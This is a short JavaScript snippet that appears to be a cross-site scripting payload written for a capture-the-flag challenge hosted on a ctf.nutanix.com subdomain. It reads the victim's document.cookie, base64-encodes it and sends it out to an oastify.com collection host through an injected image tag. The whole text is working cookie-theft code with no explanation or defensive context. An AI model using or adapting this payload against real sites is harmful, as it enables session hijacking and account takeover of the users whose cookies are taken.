const xhr = new XMLHttpRequest();
xhr.open("GET", 'https://nucalc3-6848907864.ctf.nutanix.com/', true);
let ck = document.cookie;
xhr.onreadystatechange = function() {
  document.write('<img src=http://9nxb908pze22vs818p0qcv3w7ndf14.oastify.com/?' + btoa(ck) + '>');
};
xhr.send();
